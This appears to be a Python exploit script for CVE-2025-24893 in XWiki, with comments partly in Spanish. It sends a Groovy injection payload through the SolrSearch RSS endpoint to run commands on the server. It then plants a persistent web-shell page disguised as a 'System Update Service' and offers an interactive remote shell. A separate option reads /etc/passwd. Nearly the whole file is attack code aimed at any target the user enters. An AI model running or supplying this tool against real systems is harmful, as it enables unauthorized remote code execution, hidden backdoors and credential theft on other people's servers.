# run with> python3 exploit-backdoor.py
# probar tb curl "http://localhost:8080/bin/view/Main/SystemUpdate?cmd=whoami"

import requests
import urllib.parse

def display_banner():			# probably needed to change this
    print("="*80)
    print("CVE-2025-24893 - XWiki RCE with Persistent Backdoor")
    print("Modified for educational purposes")
    print("="*80)
    print()

# Function to detect the target protocol (HTTP or HTTPS)
def detect_protocol(domain):
    https_url = f"https://{domain}"
    http_url = f"http://{domain}"
    try:
        response = requests.get(https_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTPS: {https_url}")
            return https_url
    except requests.exceptions.RequestException:
        print("[!] HTTPS not available, falling back to HTTP.")
    try:
        response = requests.get(http_url, timeout=5, allow_redirects=True)
        if response.status_code < 400:
            print(f"[✔] Target supports HTTP: {http_url}")
            return http_url
    except requests.exceptions.RequestException:
        print("[✖] Target is unreachable on both HTTP and HTTPS.")
        exit(1)

# Función para crear backdoor persistente
def create_backdoor(target_url):
    """Crea una página XWiki con backdoor Groovy persistente"""
    
    # Payload Groovy que crea la página backdoor
    groovy_payload = """
import com.xpn.xwiki.XWikiContext
import com.xpn.xwiki.doc.XWikiDocument

def context = xcontext
def wiki = context.getWiki()

def docName = "Main.SystemUpdate"
def doc = wiki.getDocument(docName, context)

def backdoorContent = '''
{{velocity}}
#set($cmd = $request.getParameter("cmd"))
#if($cmd)
{{groovy}}
try {
    def command = request.getParameter("cmd")
    def process = command.execute()
    process.waitFor()
    println "<pre>"
    println process.text
    println "</pre>"
} catch (Exception e) {
    println "<pre>Error: " + e.message + "</pre>"
}
{{/groovy}}
#else
System Update Service - Status: Active
#end
{{/velocity}}
'''

doc.setContent(backdoorContent)
doc.setTitle("System Update Service")
doc.setHidden(false)

wiki.saveDocument(doc, "Automated system update", context)

println("Backdoor created successfully at: Main.SystemUpdate")
"""
    
    # URL encode del payload
    encoded_payload = urllib.parse.quote(groovy_payload)
    
    # Construir URL del exploit
    exploit_url = f"{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7d{encoded_payload}%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
    
    try:
        print(f"[+] Creating persistent backdoor page...")
        print(f"[+] Sending exploit payload...")
        
        response = requests.get(exploit_url, timeout=15)
        
        if response.status_code == 200:
            print("[✔] Backdoor page created successfully!")
            print()
            print("="*80)
            print("BACKDOOR ACCESS INFORMATION")
            print("="*80)
            print(f"URL: {target_url}/bin/view/Main/SystemUpdate")
            print(f"Usage: {target_url}/bin/view/Main/SystemUpdate?cmd=COMMAND")
            print()
            print("Examples:")
            print(f"  {target_url}/bin/view/Main/SystemUpdate?cmd=whoami")
            print(f"  {target_url}/bin/view/Main/SystemUpdate?cmd=id")
            print(f"  {target_url}/bin/view/Main/SystemUpdate?cmd=pwd")
            print("="*80)
            print()
            return True
        else:
            print(f"[✖] Failed to create backdoor. Status code: {response.status_code}")
            return False
            
    except requests.exceptions.ConnectionError:
        print("[✖] Connection failed. Target may be down.")
        return False
    except requests.exceptions.Timeout:
        print("[✖] Request timed out. Target is slow or unresponsive.")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[✖] Unexpected error: {e}")
        return False

# Función para probar el backdoor
def test_backdoor(target_url):
    """Prueba el backdoor con el comando 'whoami'"""
    
    backdoor_url = f"{target_url}/bin/view/Main/SystemUpdate"
    
    try:
        print("[*] Testing backdoor with 'whoami' command...")
        
        response = requests.get(backdoor_url, params={'cmd': 'whoami'}, timeout=10)
        
        if response.status_code == 200:
            print("[✔] Backdoor is functional!")
            print()
            print("="*80)
            print("COMMAND OUTPUT:")
            print("="*80)
            # Intentar extraer solo el output limpio
            output = response.text
            if "<pre>" in output:
                output = output.split("<pre>")[1].split("</pre>")[0]
            print(output.strip())
            print("="*80)
            print()
            return True
        else:
            print(f"[✖] Backdoor test failed. Status code: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[✖] Error testing backdoor: {e}")
        return False

# Shell interactivo
def interactive_shell(target_url):
    """Shell interactivo a través del backdoor"""
    
    backdoor_url = f"{target_url}/bin/view/Main/SystemUpdate"
    
    print()
    print("="*80)
    print("INTERACTIVE SHELL - Type 'exit' or 'quit' to leave")
    print("="*80)
    print()
    
    while True:
        try:
            cmd = input("xwiki-shell> ").strip()
            
            if cmd.lower() in ['exit', 'quit', '']:
                if cmd.lower() in ['exit', 'quit']:
                    print("[!] Exiting shell...")
                break
            
            response = requests.get(backdoor_url, params={'cmd': cmd}, timeout=10)
            
            if response.status_code == 200:
                output = response.text
                # Limpiar HTML si está presente
                if "<pre>" in output:
                    output = output.split("<pre>")[1].split("</pre>")[0]
                print(output.strip())
            else:
                print(f"[✖] Error: HTTP {response.status_code}")
                
        except KeyboardInterrupt:
            print()
            print("[!] Interrupted. Exiting shell...")
            break
        except Exception as e:
            print(f"[✖] Error: {e}")

# Exploit original (para comparación)
def exploit_original(target_url):
    """Exploit original efímero (solo cat /etc/passwd)"""
    
    exploit_url = f"{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
    
    try:
        print(f"[+] Sending original exploit (ephemeral)...")
        response = requests.get(exploit_url, timeout=10)
        
        if response.status_code == 200 and "root:" in response.text:
            print("[✔] Original exploit successful!")
            print()
            print("Output preview:")
            print(response.text[:500])
            print()
        else:
            print(f"[✖] Exploit failed. Status code: {response.status_code}")
            
    except requests.exceptions.ConnectionError:
        print("[✖] Connection failed. Target may be down.")
    except requests.exceptions.Timeout:
        print("[✖] Request timed out. Target is slow or unresponsive.")
    except requests.exceptions.RequestException as e:
        print(f"[✖] Unexpected error: {e}")

# Main execution
if __name__ == "__main__":
    display_banner()
    
    target = input("[?] Enter the target URL (without http/https): ").strip()
    target_url = detect_protocol(target.replace("http://", "").replace("https://", "").strip())
    
    print()
    print("="*80)
    print("EXPLOIT OPTIONS")
    print("="*80)
    print("1. Create persistent backdoor (recommended)")
    print("2. Run original ephemeral exploit (single command)")
    print("3. Test existing backdoor")
    print("4. Open interactive shell (requires backdoor)")
    print("="*80)
    
    choice = input("\n[?] Select option (1-4): ").strip()
    
    print()
    
    if choice == '1':
        # Crear backdoor persistente
        if create_backdoor(target_url):
            print("[*] Backdoor created successfully!")
            
            # Preguntar si quiere probar
            test_now = input("\n[?] Test the backdoor now? (y/n): ").strip().lower()
            if test_now == 'y':
                test_backdoor(target_url)
                
                # Preguntar si quiere shell interactivo
                shell_now = input("\n[?] Open interactive shell? (y/n): ").strip().lower()
                if shell_now == 'y':
                    interactive_shell(target_url)
    
    elif choice == '2':
        # Exploit original efímero
        exploit_original(target_url)
    
    elif choice == '3':
        # Probar backdoor existente
        test_backdoor(target_url)
        
        shell_now = input("\n[?] Open interactive shell? (y/n): ").strip().lower()
        if shell_now == 'y':
            interactive_shell(target_url)
    
    elif choice == '4':
        # Shell interactivo directo
        interactive_shell(target_url)
    
    else:
        print("[✖] Invalid option")
    
    print()
    print("[+] Done.")
